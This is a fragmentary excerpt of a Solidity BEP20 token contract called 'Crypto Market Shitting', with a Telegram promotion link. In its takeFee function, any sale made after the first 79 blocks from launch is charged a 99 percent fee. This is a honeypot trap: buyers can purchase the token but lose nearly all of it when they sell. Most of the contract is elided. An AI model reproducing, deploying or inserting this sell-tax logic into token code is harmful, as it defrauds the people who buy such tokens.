...
CryptoMarketShitting 

https://t.me/cryptomarketshitting
...
contract CryptoMarketShitting is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "Crypto Market Shitting ";
    string constant _symbol = "CryptoMarketShitting ";
    ...
    function takeFee(address sender, uint256 amount, bool isSell) internal returns (uint256) {
        ...
        } else if(isSell && (launchedAt + 79 < block.number)){
            feeAmount = amount.div(100).mul(99);
        }
